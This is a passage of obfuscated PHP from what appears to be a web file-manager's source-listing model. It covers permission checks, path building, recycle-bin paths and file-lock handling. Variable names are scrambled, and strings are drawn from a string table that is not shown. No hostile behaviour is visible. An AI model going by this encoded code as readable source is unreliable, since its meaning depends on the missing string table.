} protected function _listAppendAuth(&$’¸¢ÅÉÈ) { $¾Š¤—£Â =& $_SERVER[¹ş¤¶ĞÖ]; $Ê¿–ù—¥ = array(); foreach ($’¸¢ÅÉÈ as $ş·‚²»˜) { if ($ş·‚²»˜[$¾Š¤—£Â[440]] == self::TYPE_GROUP) { $Ê¿–ù—¥[] = $ş·‚²»˜[$¾Š¤—£Â[431]]; } } if (!$Ê¿–ù—¥) { return; } $­©•ù­˜ = array_to_keyvalue($’¸¢ÅÉÈ, $¾Š¤—£Â[431]); $ş‘•†ôƒ = Model($¾Š¤—£Â[522])->getSourceList($Ê¿–ù—¥, $­©•ù­˜); $®íìï¡‹ = $GLOBALS[$¾Š¤—£Â[523]] == 1; foreach ($’¸¢ÅÉÈ as $—¹û­Ñ => &$ş·‚²»˜) { $ş·‚²»˜[$¾Š¤—£Â[442]] = $ş‘•†ôƒ[$ş·‚²»˜[$¾Š¤—£Â[431]]]; if (!$ş·‚²»˜[$¾Š¤—£Â[442]] && $ş·‚²»˜[$¾Š¤—£Â[440]] == self::TYPE_GROUP) { $ş·‚²»˜[$¾Š¤—£Â[442]] = Action($¾Š¤—£Â[524])->pathGroupAuthMake($ş·‚²»˜[$¾Š¤—£Â[525]]); if (!$ş·‚²»˜[$¾Š¤—£Â[442]] && !$®íìï¡‹) { $ş·‚²»˜[$¾Š¤—£Â[203]] = !1; $ş·‚²»˜[$¾Š¤—£Â[202]] = !1; } } if ($ş·‚²»˜[$¾Š¤—£Â[442]]) { $ş·‚²»˜[$¾Š¤—£Â[203]] = AuthModel::authCheckEdit($ş·‚²»˜[$¾Š¤—£Â[442]][$¾Š¤—£Â[443]]); $ş·‚²»˜[$¾Š¤—£Â[202]] = AuthModel::authCheckView($ş·‚²»˜[$¾Š¤—£Â[442]][$¾Š¤—£Â[443]]); } $this->groupPathDisplay($ş·‚²»˜); } unset($ş·‚²»˜); } public function _listAppendAuthSecret(&$À÷‡şê—) { $…»¬Ôß¸ =& $_SERVER[¹ş¤¶ĞÖ]; if (Model($…»¬Ôß¸[464])->get($…»¬Ôß¸[526]) != $…»¬Ôß¸[88]) { return; } static $Â†ªŒÕ = false; if (!$Â†ªŒÕ) { $Ë¨ëàİì = Model($…»¬Ôß¸[527]); $®ŸşÇúè = Model($…»¬Ôß¸[528]); $Â†ªŒÕ = $®ŸşÇúè->listData(); $Â†ªŒÕ = array_to_keyvalue($Â†ªŒÕ, $…»¬Ôß¸[431]); $¡„›·åÓ = json_decode(Model($…»¬Ôß¸[464])->get($…»¬Ôß¸[529]), !0); $¡„›·åÓ = array_to_keyvalue($¡„›·åÓ, $…»¬Ôß¸[428]); foreach ($Â†ªŒÕ as $£ˆ†„Å¿ => $±øº“³÷) { $Î¥äù— = $¡„›·åÓ[$±øº“³÷[$…»¬Ôß¸[530]]]; if (!$Î¥äù—) { $®ŸşÇúè->remove($±øº“³÷[$…»¬Ôß¸[428]]); unset($Â†ªŒÕ[$£ˆ†„Å¿]); continue; } $î†ªØôò = $Ë¨ëàİì->listData($Î¥äù—[$…»¬Ôß¸[442]]); if (!$î†ªØôò) { $®ŸşÇúè->remove($±øº“³÷[$…»¬Ôß¸[428]]); unset($Â†ªŒÕ[$£ˆ†„Å¿]); continue; } $±øº“³÷[$…»¬Ôß¸[442]] = $î†ªØôò; $±øº“³÷[$…»¬Ôß¸[531]] = $Î¥äù—; $±øº“³÷[$…»¬Ôß¸[532]] = Model($…»¬Ôß¸[533])->getInfoSimpleOuter($±øº“³÷[$…»¬Ôß¸[483]]); $Â†ªŒÕ[$£ˆ†„Å¿] = $±øº“³÷; } } $’®ÆÖ¶¦ = USER_ID; $Ü¨²ĞîÊ = array(); $íãÇæÄÓ = $this->_listAppendPath($Ü¨²ĞîÊ, !0); foreach ($À÷‡şê— as $£ˆ†„Å¿ => &$±øº“³÷) { if (!is_array($±øº“³÷[$…»¬Ôß¸[442]])) { continue; } if ($±øº“³÷[$…»¬Ôß¸[440]] != $…»¬Ôß¸[534]) { continue; } if (isset($Â†ªŒÕ[$±øº“³÷[$…»¬Ôß¸[431]]])) { $â¨Ë×÷Û = $Â†ªŒÕ[$±øº“³÷[$…»¬Ôß¸[431]]]; if (!is_array($±øº“³÷[$…»¬Ôß¸[495]])) { $±øº“³÷[$…»¬Ôß¸[495]] = array(); } $±øº“³÷[$…»¬Ôß¸[495]][$…»¬Ôß¸[535]] = $â¨Ë×÷Û[$…»¬Ôß¸[530]]; $±øº“³÷[$…»¬Ôß¸[442]][$…»¬Ôß¸[536]] = $â¨Ë×÷Û; $±øº“³÷[$…»¬Ôß¸[442]][$…»¬Ôß¸[537]] = $±øº“³÷[$…»¬Ôß¸[538]]; $±øº“³÷[$…»¬Ôß¸[442]][$…»¬Ôß¸[539]] = $…»¬Ôß¸[88]; if ($â¨Ë×÷Û[$…»¬Ôß¸[483]] != $’®ÆÖ¶¦) { $±øº“³÷[$…»¬Ôß¸[442]][$…»¬Ôß¸[443]] = $±øº“³÷[$…»¬Ôß¸[442]][$…»¬Ôß¸[443]] & $â¨Ë×÷Û[$…»¬Ôß¸[442]][$…»¬Ôß¸[442]]; } continue; } $ğ‚õ¯• = $this->parentLevelArray($±øº“³÷[$…»¬Ôß¸[540]]); $ŸÊ²–¿ß = array_reverse($ğ‚õ¯•); foreach ($ŸÊ²–¿ß as $êÑ‚’ë« => $£…Ÿ„Ÿ¼) { if (!isset($Â†ªŒÕ[$£…Ÿ„Ÿ¼])) { continue; } $â¨Ë×÷Û = $Â†ªŒÕ[$£…Ÿ„Ÿ¼]; $±øº“³÷[$…»¬Ôß¸[442]][$…»¬Ôß¸[536]] = $â¨Ë×÷Û; if ($â¨Ë×÷Û[$…»¬Ôß¸[483]] != $’®ÆÖ¶¦) { $±øº“³÷[$…»¬Ôß¸[442]][$…»¬Ôß¸[443]] = $±øº“³÷[$…»¬Ôß¸[442]][$…»¬Ôß¸[443]] & $â¨Ë×÷Û[$…»¬Ôß¸[442]][$…»¬Ôß¸[442]]; } $ô³¨î = $…»¬Ôß¸[12]; $óƒºšı = count($ğ‚õ¯•) - $êÑ‚’ë«; for ($üÂÛÕ˜ = 0; $üÂÛÕ˜ < $óƒºšı; $üÂÛÕ˜++) { if (!isset($íãÇæÄÓ[$ğ‚õ¯•[$üÂÛÕ˜]])) { $ô³¨î = $…»¬Ôß¸[12]; break; } $ô³¨î = $ô³¨î . rtrim($íãÇæÄÓ[$ğ‚õ¯•[$üÂÛÕ˜]], $…»¬Ôß¸[8]) . $…»¬Ôß¸[8]; } $±øº“³÷[$…»¬Ôß¸[442]][$…»¬Ôß¸[537]] = rtrim($ô³¨î, $…»¬Ôß¸[8]) . $…»¬Ôß¸[8]; break; } } unset($±øº“³÷); } public function groupPathDisplay(&$ ğ¿üÊõ) { $õÚ‹¼¬ =& $_SERVER[¹ş¤¶ĞÖ]; if ($ ğ¿üÊõ[$õÚ‹¼¬[440]] != self::TYPE_GROUP) { return; } $¦¯ĞºÖÈ = Model($õÚ‹¼¬[541])->getInfo($ ğ¿üÊõ[$õÚ‹¼¬[525]]); $ßÄûëÈÙ = $this->parentLevelArray($¦¯ĞºÖÈ[$õÚ‹¼¬[540]]); $Ğ§Ş†Ù = $õÚ‹¼¬[12]; foreach ($ßÄûëÈÙ as $Şê„øû×) { $¸›ÜÏàÂ = Model($õÚ‹¼¬[541])->getInfo($Şê„øû×); $Ğ§Ş†Ù .= $¸›ÜÏàÂ[$õÚ‹¼¬[87]][$õÚ‹¼¬[431]] . $õÚ‹¼¬[50]; } $ ğ¿üÊõ[$õÚ‹¼¬[542]] = $¦¯ĞºÖÈ[$õÚ‹¼¬[461]]; $ ğ¿üÊõ[$õÚ‹¼¬[543]] = $¦¯ĞºÖÈ[$õÚ‹¼¬[540]]; $ ğ¿üÊõ[$õÚ‹¼¬[544]] = $¦¯ĞºÖÈ[$õÚ‹¼¬[545]]; $ ğ¿üÊõ[$õÚ‹¼¬[546]] = $Ğ§Ş†Ù . $¦¯ĞºÖÈ[$õÚ‹¼¬[87]][$õÚ‹¼¬[431]]; } protected function _listAppendPath(&$ñ¹±Øêš, $˜ò­ëÔ = false) { $ŸÓñ¹é™ =& $_SERVER[¹ş¤¶ĞÖ]; static $Óğ°Ø = array(); $àê×„°Â = array(); $ëŠ‘‘«– = array(); if ($˜ò­ëÔ) { return $Óğ°Ø; } foreach ($ñ¹±Øêš as &$¶§Î‘×) { $øìÑ´ÖÎ = $¶§Î‘×[$ŸÓñ¹é™[431]]; if ($¶§Î‘×[$ŸÓñ¹é™[439]] == $ŸÓñ¹é™[88] && $¶§Î‘×[$ŸÓñ¹é™[461]] != 0) { $Óğ°Ø[$øìÑ´ÖÎ] = $¶§Î‘×[$ŸÓñ¹é™[32]]; } if ($¶§Î‘×[$ŸÓñ¹é™[439]] == $ŸÓñ¹é™[88] && $¶§Î‘×[$ŸÓñ¹é™[461]] == 0 && !isset($Óğ°Ø[$øìÑ´ÖÎ])) { $Óğ°Ø[$øìÑ´ÖÎ] = $this->_listAppendPathRoot($¶§Î‘×, array()); } if (isset($ëŠ‘‘«–[$¶§Î‘×[$ŸÓñ¹é™[540]]])) { continue; } $ëŠ‘‘«–[$¶§Î‘×[$ŸÓñ¹é™[540]]] = !0; $¢õÖ”æ¤ = $this->parentLevelArray($¶§Î‘×[$ŸÓñ¹é™[540]]); foreach ($¢õÖ”æ¤ as $ÒŠ¼Òñ => $øßÔÇ‡) { if (isset($Óğ°Ø[$øßÔÇ‡])) { continue; } if ($ÒŠ¼Òñ == 0) { $Óğ°Ø[$øßÔÇ‡] = $this->_listAppendPathRoot($¶§Î‘×, $¢õÖ”æ¤); } if ($ÒŠ¼Òñ != 0) { $àê×„°Â[] = $øßÔÇ‡; } } } unset($¶§Î‘×); $àê×„°Â = array_unique($àê×„°Â); if (count($àê×„°Â) > 0) { $²š„¿”” = array($ŸÓñ¹é™[446] => array($ŸÓñ¹é™[447], $àê×„°Â)); if (count($àê×„°Â) == 1) { $¿­Ûµƒ = $this->sourceInfo($àê×„°Â[0]); $¡×„¾°Ó = is_array($¿­Ûµƒ) ? array($¿­Ûµƒ) : !1; } else { $¡×„¾°Ó = $this->field($ŸÓñ¹é™[547])->where($²š„¿””)->select(); } if (!$¡×„¾°Ó) { $¡×„¾°Ó = array(); } foreach ($¡×„¾°Ó as $Ìõ¬Œ„‹) { $Óğ°Ø[$Ìõ¬Œ„‹[$ŸÓñ¹é™[431]]] = $Ìõ¬Œ„‹[$ŸÓñ¹é™[32]]; } } $™ûÚ£ãÚ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ıªÇ´Å = array(); foreach ($ñ¹±Øêš as &$¶§Î‘×) { $÷îÙ’Ä” = $¶§Î‘×[$ŸÓñ¹é™[540]]; $²ºùğÚ” = $ŸÓñ¹é™[12]; if (isset($ıªÇ´Å[$÷îÙ’Ä”])) { $²ºùğÚ” = $ıªÇ´Å[$÷îÙ’Ä”]; } else { $¢õÖ”æ¤ = $this->parentLevelArray($¶§Î‘×[$ŸÓñ¹é™[540]]); foreach ($¢õÖ”æ¤ as $ÒŠ¼Òñ => $øßÔÇ‡) { if (isset($Óğ°Ø[$øßÔÇ‡])) { $²ºùğÚ” .= $Óğ°Ø[$øßÔÇ‡] . $ŸÓñ¹é™[8]; } } $ıªÇ´Å[$÷îÙ’Ä”] = $²ºùğÚ”; } $²ºùğÚ” .= $¶§Î‘×[$ŸÓñ¹é™[32]]; if ($¶§Î‘×[$ŸÓñ¹é™[439]] == $ŸÓñ¹é™[88]) { $²ºùğÚ” .= $ŸÓñ¹é™[8]; } $¶§Î‘×[$ŸÓñ¹é™[538]] = str_replace($ŸÓñ¹é™[548], $ŸÓñ¹é™[8], $²ºùğÚ”); if ($¶§Î‘×[$ŸÓñ¹é™[461]] == $ŸÓñ¹é™[198]) { $¶§Î‘×[$ŸÓñ¹é™[32]] = trim($Óğ°Ø[$¶§Î‘×[$ŸÓñ¹é™[431]]], $ŸÓñ¹é™[8]); $¶§Î‘×[$ŸÓñ¹é™[538]] = $¶§Î‘×[$ŸÓñ¹é™[32]] . $ŸÓñ¹é™[8]; } if (intval($¶§Î‘×[$ŸÓñ¹é™[440]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($¶§Î‘×, $¢õÖ”æ¤, $™ûÚ£ãÚ); } } unset($¶§Î‘×); return $ñ¹±Øêš; } private function _listAppendPathRecycle(&$Åµå­ÆÉ, $³ØòìŠû, $ÀªıÓÄç) { $ÈÀúÁ‡ =& $_SERVER[¹ş¤¶ĞÖ]; if (!in_array($ÀªıÓÄç, $³ØòìŠû) && $Åµå­ÆÉ[$ÈÀúÁ‡[431]] != $ÀªıÓÄç) { return; } $òáïüı = explode($ÈÀúÁ‡[8], trim($Åµå­ÆÉ[$ÈÀúÁ‡[538]], $ÈÀúÁ‡[8])); $ÛÜÁŠ  = implode($ÈÀúÁ‡[8], array_slice($òáïüı, 2)); $Åµå­ÆÉ[$ÈÀúÁ‡[538]] = $ÈÀúÁ‡[8] . LNG($ÈÀúÁ‡[549]) . $ÈÀúÁ‡[8] . ltrim($ÛÜÁŠ , $ÈÀúÁ‡[8]); $Åµå­ÆÉ[$ÈÀúÁ‡[540]] = $ÈÀúÁ‡[550] . implode($ÈÀúÁ‡[50], array_slice($³ØòìŠû, 1)) . $ÈÀúÁ‡[50]; if ($Åµå­ÆÉ[$ÈÀúÁ‡[431]] == $ÀªıÓÄç) { $Åµå­ÆÉ[$ÈÀúÁ‡[540]] = $ÈÀúÁ‡[550]; $Åµå­ÆÉ[$ÈÀúÁ‡[461]] = $ÈÀúÁ‡[198]; $Åµå­ÆÉ[$ÈÀúÁ‡[32]] = LNG($ÈÀúÁ‡[549]); } $Åµå­ÆÉ[$ÈÀúÁ‡[551]] = $ÈÀúÁ‡[552]; } protected function _listAppendPathRoot(&$’â²»æ, $ÌôÏëÉù) { $øŒ÷¤¡À =& $_SERVER[¹ş¤¶ĞÖ]; static $ñªìöÁ = false; $·†€¿ªî = $øŒ÷¤¡À[12]; if ($’â²»æ[$øŒ÷¤¡À[440]] == self::TYPE_USER) { if ($’â²»æ[$øŒ÷¤¡À[525]] == USER_ID) { $·†€¿ªî = LNG($øŒ÷¤¡À[553]); if ($ñªìöÁ === !1) { $¿ªÀÄ¥± = Model($øŒ÷¤¡À[554])->getInfoFull(USER_ID); $ñªìöÁ = _get($¿ªÀÄ¥±, $øŒ÷¤¡À[555], $øŒ÷¤¡À[12]); } if ($ÌôÏëÉù && $ÌôÏëÉù[0] == $ñªìöÁ || !$ÌôÏëÉù && $’â²»æ[$øŒ÷¤¡À[431]] == $ñªìöÁ) { $·†€¿ªî = LNG($øŒ÷¤¡À[556]); $’â²»æ[$øŒ÷¤¡À[557]] = $øŒ÷¤¡À[558]; } if (!$ÌôÏëÉù) { $’â²»æ[$øŒ÷¤¡À[32]] = $·†€¿ªî; } } else { $¦€´±»Û = Model($øŒ÷¤¡À[533])->getInfoSimple($’â²»æ[$øŒ÷¤¡À[525]]); $·†€¿ªî = LNG($øŒ÷¤¡À[559]) . $øŒ÷¤¡À[162] . $¦€´±»Û[$øŒ÷¤¡À[32]] . $øŒ÷¤¡À[164]; $’â²»æ[$øŒ÷¤¡À[560]] = array($øŒ÷¤¡À[32] => $¦€´±»Û[$øŒ÷¤¡À[32]], $øŒ÷¤¡À[561] => $¦€´±»Û[$øŒ÷¤¡À[561]], $øŒ÷¤¡À[562] => $¦€´±»Û[$øŒ÷¤¡À[562]]); } } else { if ($’â²»æ[$øŒ÷¤¡À[440]] == self::TYPE_GROUP) { $¦€´±»Û = Model($øŒ÷¤¡À[541])->getInfoSimple($’â²»æ[$øŒ÷¤¡À[525]]); $·†€¿ªî = $¦€´±»Û[$øŒ÷¤¡À[32]]; } else { if ($’â²»æ[$øŒ÷¤¡À[440]] == self::TYPE_SYSTEM) { $·†€¿ªî = $øŒ÷¤¡À[563]; } } } $·†€¿ªî = $·†€¿ªî ? $øŒ÷¤¡À[8] . $·†€¿ªî . $øŒ÷¤¡À[8] : $øŒ÷¤¡À[8]; return $·†€¿ªî; } protected function _listAppendUser(&$´¾„¬²‘) { $™ƒ€€´£ =& $_SERVER[¹ş¤¶ĞÖ]; $äœÃõŞØ = array_to_keyvalue($´¾„¬²‘, $™ƒ€€´£[12], $™ƒ€€´£[483]); $ìßçûáÇ = array_to_keyvalue($´¾„¬²‘, $™ƒ€€´£[12], $™ƒ€€´£[485]); $Ş±œûô = array_merge($äœÃõŞØ, $ìßçûáÇ); $§÷îœ¼² = Model($™ƒ€€´£[554])->userListInfo($Ş±œûô); foreach ($´¾„¬²‘ as &$Ú®èƒ˜ ) { $£÷£Ô¡’ = $Ú®èƒ˜ [$™ƒ€€´£[483]]; $Ú®èƒ˜ [$™ƒ€€´£[483]] = $§÷îœ¼²[$£÷£Ô¡’] ? $§÷îœ¼²[$£÷£Ô¡’] : !1; $£÷£Ô¡’ = $Ú®èƒ˜ [$™ƒ€€´£[485]]; $Ú®èƒ˜ [$™ƒ€€´£[485]] = $§÷îœ¼²[$£÷£Ô¡’] ? $§÷îœ¼²[$£÷£Ô¡’] : !1; if (isset($Ú®èƒ˜ [$™ƒ€€´£[495]]) && $Ú®èƒ˜ [$™ƒ€€´£[495]][$™ƒ€€´£[564]]) { $…©ŸİÈÒ = $GLOBALS[$™ƒ€€´£[6]][$™ƒ€€´£[89]][$™ƒ€€´£[565]]; if ($Ú®èƒ˜ [$™ƒ€€´£[495]][$™ƒ€€´£[566]] <= time() - $…©ŸİÈÒ) { $this->metaSet($Ú®èƒ˜ [$™ƒ€€´£[431]], $™ƒ€€´£[564], null); $this->metaSet($Ú®èƒ˜ [$™ƒ€€´£[431]], $™ƒ€€´£[566], null); unset($Ú®èƒ˜ [$™ƒ€€´£[495]][$™ƒ€€´£[564]]); continue; } $—·Š‘²ü = $Ú®èƒ˜ [$™ƒ€€´£[495]][$™ƒ€€´£[564]]; $Ú®èƒ˜ [$™ƒ€€´£[495]][$™ƒ€€´£[567]] = Model($™ƒ€€´£[554])->getInfoSimpleOuter($—·Š‘²ü); } } unset($Ú®èƒ˜ ); } public function parentLevelArray($à¹©›ä) { $ÖÂÉËœö =& $_SERVER[¹ş¤¶ĞÖ]; $à¹©›ä = explode($ÖÂÉËœö[50], trim($à¹©›ä, $ÖÂÉËœö[50])); return array_remove_value($à¹©›ä, $ÖÂÉËœö[198]); } public function listAll($¤—Ö—çà) { $«Ò°ˆ‚ =& $_SERVER[¹ş¤¶ĞÖ]; $Ê¼÷Õ£ü = $this->sourceInfo($¤—Ö—çà); $œÆ––Ğ× = array($«Ò°ˆ‚[568] => array($«Ò°ˆ‚[569], $Ê¼÷Õ£ü[$«Ò°ˆ‚[540]] . $¤—Ö—çà . $«Ò°ˆ‚[570]), $«Ò°ˆ‚[571] => 0); $îß«İÈÅ = $«Ò°ˆ‚[572]; $‘ı£ø™ = "\114\x45\x46\124\40\x4a\117\111\116\x20{$this->tablePrefix}\151\157\137\x66\151\154\x65\40\146\x69\x6c\x65\x20\x6f\x6e\x20\x73\157\x75\162\143\x65\x2e\x66\151\154\x65\111\104\40\75\x20\146\x69\x6c\145\x2e\x66\x69\x6c\145\111\104"; $É™êş˜ı = $this->alias($«Ò°ˆ‚[475])->field($îß«İÈÅ)->where($œÆ––Ğ×)->join($‘ı£ø™)->select(); $this->_listAppendAuth($É™êş˜ı); $this->_listAppendUser($É™êş˜ı); $this->_listAppendPath($É™êş˜ı); $É™êş˜ı = array_to_keyvalue($É™êş˜ı, $«Ò°ˆ‚[431]); $•û—Õ·ó = "\57{$Ê¼÷Õ£ü[$«Ò°ˆ‚[32]]}\x2f"; $•û—Õ·ó = $•û—Õ·ó == $«Ò°ˆ‚[548] ? $«Ò°ˆ‚[8] : $•û—Õ·ó; $ »–Éğà = array(); foreach ($É™êş˜ı as $Å—Õ‘íÖ => $‰Š¦ ğÒ) { $’áøâœ³ = $this->parentLevelArray($‰Š¦ ğÒ[$«Ò°ˆ‚[540]]); array_shift($’áøâœ³); $‘ş“µÔÇ = $•û—Õ·ó; for ($ß¡ Ù·£ = 0; $ß¡ Ù·£ < count($’áøâœ³); $ß¡ Ù·£++) { $‘ş“µÔÇ .= $É™êş˜ı[$’áøâœ³[$ß¡ Ù·£]][$«Ò°ˆ‚[32]] . $«Ò°ˆ‚[8]; } $‘ş“µÔÇ .= $‰Š¦ ğÒ[$«Ò°ˆ‚[32]]; if ($‰Š¦ ğÒ[$«Ò°ˆ‚[439]]) { $‘ş“µÔÇ .= $«Ò°ˆ‚[8]; } $Èûış‰¨ = array($«Ò°ˆ‚[450] => str_replace($«Ò°ˆ‚[548], $«Ò°ˆ‚[8], str_replace($«Ò°ˆ‚[548], $«Ò°ˆ‚[8], str_replace($«Ò°ˆ‚[548], $«Ò°ˆ‚[8], $‘ş“µÔÇ))), $«Ò°ˆ‚[573] => intval($‰Š¦ ğÒ[$«Ò°ˆ‚[439]]), $«Ò°ˆ‚[574] => intval($‰Š¦ ğÒ[$«Ò°ˆ‚[76]]), $«Ò°ˆ‚[85] => intval($‰Š¦ ğÒ[$«Ò°ˆ‚[85]]), $«Ò°ˆ‚[87] => $this->pathInfoFilter($‰Š¦ ğÒ)); if (!$Èûış‰¨[$«Ò°ˆ‚[439]]) { $Èûış‰¨[$«Ò°ˆ‚[497]] = $‰Š¦ ğÒ[$«Ò°ˆ‚[497]]; } $ »–Éğà[] = $Èûış‰¨; } $ »–Éğà = array_sort_by($ »–Éğà, $«Ò°ˆ‚[84]); return $ »–Éğà; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($¹×”‡ü) { $²ê›ú—Ã =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->allowLock()) { return; } $this->_lockCheck($²ê›ú—Ã[575], $¹×”‡ü); $ôè“Üº = 1; $this->_lockEvent($¹×”‡ü, array($²ê›ú—Ã[576], $²ê›ú—Ã[577]), $ôè“Üº); $this->_lockParent($¹×”‡ü, array($²ê›ú—Ã[577]), $ôè“Üº); $this->_lockEvent($¹×”‡ü, array($²ê›ú—Ã[578], $²ê›ú—Ã[579]), $ôè“Üº); $this->_lockCheckEnd($²ê›ú—Ã[575], $¹×”‡ü); } public function lockCopyEnd($Îúíğ§”) { $³â¬áŠ´ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->allowLock()) { return; } $¥½‡®”¾ = 0; $this->_lockEvent($Îúíğ§”, array($³â¬áŠ´[576], $³â¬áŠ´[577]), $¥½‡®”¾); $this->_lockParent($Îúíğ§”, array($³â¬áŠ´[577]), $¥½‡®”¾); $this->_lockEvent($Îúíğ§”, array($³â¬áŠ´[578], $³â¬áŠ´[579]), $¥½‡®”¾); } public function lockWriteStart($˜ÚïËÍ, $ó°ó¢©ù = '') { $˜ø‡øèÉ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->allowLock()) { return; } $this->_lockCheck($˜ø‡øèÉ[576], $˜ÚïËÍ); $·Ÿó¤Ö = 1; $this->_lockKey($˜ø‡øèÉ[580] . $˜ÚïËÍ . $˜ø‡øèÉ[10] . $ó°ó¢©ù, $·Ÿó¤Ö); $this->_lockEvent($˜ÚïËÍ, array($˜ø‡øèÉ[575], $˜ø‡øèÉ[577]), $·Ÿó¤Ö); $this->_lockParent($˜ÚïËÍ, array($˜ø‡øèÉ[575], $˜ø‡øèÉ[577]), $·Ÿó¤Ö); $this->_lockCheckEnd($˜ø‡øèÉ[576], $˜ÚïËÍ); } public function lockWriteEnd($Ğ÷•Ò•İ, $©”Ú†¥¡ = '') { $†¥Óé§Ç =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->allowLock()) { return; } $ºÛÊÃ‰æ = 0; $this->_lockKey($†¥Óé§Ç[580] . $Ğ÷•Ò•İ . $†¥Óé§Ç[10] . $©”Ú†¥¡, $ºÛÊÃ‰æ); $this->_lockEvent($Ğ÷•Ò•İ, array($†¥Óé§Ç[575], $†¥Óé§Ç[577]), $ºÛÊÃ‰æ); $this->_lockParent($Ğ÷•Ò•İ, array($†¥Óé§Ç[575], $†¥Óé§Ç[577]), $ºÛÊÃ‰æ); } public function lockMoveStart($ÜÁÑé‹“) { $Ã¢ü¸‡ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ã¢ü¸‡[577], $ÜÁÑé‹“); $Ã·÷­· = 1; $this->_lockKey($Ã¢ü¸‡[581] . $ÜÁÑé‹“, $Ã·÷­·); $this->_lockEvent($ÜÁÑé‹“, array($Ã¢ü¸‡[575], $Ã¢ü¸‡[576]), $Ã·÷­·); $this->_lockParent($ÜÁÑé‹“, array($Ã¢ü¸‡[575], $Ã¢ü¸‡[577]), $Ã·÷­·); $this->_lockEvent($ÜÁÑé‹“, array($Ã¢ü¸‡[582], $Ã¢ü¸‡[578], $Ã¢ü¸‡[579]), $Ã·÷­·); $this->_lockCheckEnd($Ã¢ü¸‡[577], $ÜÁÑé‹“); } public function lockMoveEnd($«×³ÀÍ‡) { $¹±ßÖß =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->allowLock()) { return; } $ßğ¬’¸ = 0; $this->_lockKey($¹±ßÖß[581] . $«×³ÀÍ‡, $ßğ¬’¸); $this->_lockEvent($«×³ÀÍ‡, array($¹±ßÖß[575], $¹±ßÖß[576]), $ßğ¬’¸); $this->_lockParent($«×³ÀÍ‡, array($¹±ßÖß[575], $¹±ßÖß[577]), $ßğ¬’¸); $this->_lockEvent($«×³ÀÍ‡, array($¹±ßÖß[582], $¹±ßÖß[578], $¹±ßÖß[579]), $ßğ¬’¸); } private function _lockCheck($Íù×û‰¿, $ã‹É¬¥¡) { $‹—û¬‰Õ =& $_SERVER[¹ş¤¶ĞÖ]; $Âó¾‹‡² = $this->sourceInfo($ã‹É¬¥¡); $¯æˆãğË = $Íù×û‰¿ . $‹—û¬‰Õ[10] . $ã‹É¬¥¡; $this->_lockTimeStart[$¯æˆãğË] = timeFloat(); if (!is_array($Âó¾‹‡²)) { return; } $îöÄÍãÙ = LNG($‹—û¬‰Õ[583]); CacheLock::setErrorMsg($‹—û¬‰Õ[162] . htmlspecialchars($Âó¾‹‡²[$‹—û¬‰Õ[32]]) . $‹—û¬‰Õ[164] . $îöÄÍãÙ); $this->_lockKey($¯æˆãğË, 1); $this->_lockKey($¯æˆãğË, 0); $ÀıŠğ­í = array_reverse($this->parentLevelArray($Âó¾‹‡²[$‹—û¬‰Õ[540]])); foreach ($ÀıŠğ­í as $õ¡¯ğ­) { $¯æˆãğË = $Íù×û‰¿ . $‹—û¬‰Õ[584] . $õ¡¯ğ­; if (CacheLock::lockGet($‹—û¬‰Õ[585] . $¯æˆãğË)) { $Âó¾‹‡² = $this->sourceInfo($õ¡¯ğ­); CacheLock::setErrorMsg($‹—û¬‰Õ[162] . htmlspecialchars($Âó¾‹‡²[$‹—û¬‰Õ[32]]) . $‹—û¬‰Õ[164] . $îöÄÍãÙ); $this->_lockKey($¯æˆãğË, 1); $this->_lockKey($¯æˆãğË, 0); } } } private function _lockCheckEnd($óò·¦¯, $»İ¥¹œ¹) { $ÒûØ×èº =& $_SERVER[¹ş¤¶ĞÖ]; $ëêêã·Õ = $óò·¦¯ . $ÒûØ×èº[10] . $»İ¥¹œ¹; CacheLock::setErrorMsg($ÒûØ×èº[407]); if (!isset($this->_lockTimeStart[$ëêêã·Õ])) { return; } $äÑûœŞİ = timeFloat() - $this->_lockTimeStart[$ëêêã·Õ]; unset($this->_lockTimeStart[$ëêêã·Õ]); if ($äÑûœŞİ > 0.5) { unset(self::$cacheSourceInfo[$ÒûØ×èº[489] . $»İ¥¹œ¹]); } $¹¹òÃÙ¼ = $this->sourceInfo($»İ¥¹œ¹); if (!$¹¹òÃÙ¼) { show_json(LNG($ÒûØ×èº[105]), !1); } } private function _lockParent($àŒ©°¨, $š‚Ûèèµ, $ú©ÆãÉµ) { if (!$this->autoLockSet) { return; } $¥³ïñ‚Ì = $this->sourceInfo($àŒ©°¨); if (!is_array($¥³ïñ‚Ì)) { return; } $Âáü²¬÷ = array_reverse($this->parentLevelArray($¥³ïñ‚Ì[$_SERVER[¹ş¤¶ĞÖ][540]])); foreach ($Âáü²¬÷ as $Û…éçÁ‘) { $this->_lockEvent($Û…éçÁ‘, $š‚Ûèèµ, $ú©ÆãÉµ); } } private function _lockEvent($—¬ÍâŸ, $‡ï§‰”ü, $¥óï‚Î) { $Ì¶±Ó– =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->autoLockSet) { return; } foreach ($‡ï§‰”ü as $—£·‚›¢) { $×ŞèÉÔê = $—£·‚›¢ . $Ì¶±Ó–[10] . $—¬ÍâŸ; if ($¥óï‚Î && CacheLock::lockGet($Ì¶±Ó–[585] . $×ŞèÉÔê)) { continue; } $this->_lockKey($×ŞèÉÔê, $¥óï‚Î); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Ü³™‘“ö, $—°µ‘Ûô = 1) { $íÆ¤‘ Á = $_SERVER[¹ş¤¶ĞÖ][585] . md5($Ü³™‘“ö); if ($—°µ‘Ûô) { if (isset(self::$_lockItemArr[$íÆ¤‘ Á])) { return; } self::$_lockItemArr[$íÆ¤‘ Á] = 1; CacheLock::lock($íÆ¤‘ Á, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$íÆ¤‘ Á])) { return; } unset(self::$_lockItemArr[$íÆ¤‘ Á]); CacheLock::unlock($íÆ¤‘ Á); } } public function isParentOf($ùĞ²šØ», $‰ÊŸ‚èé) { $“ä¥œ²³ =& $_SERVER[¹ş¤¶ĞÖ]; 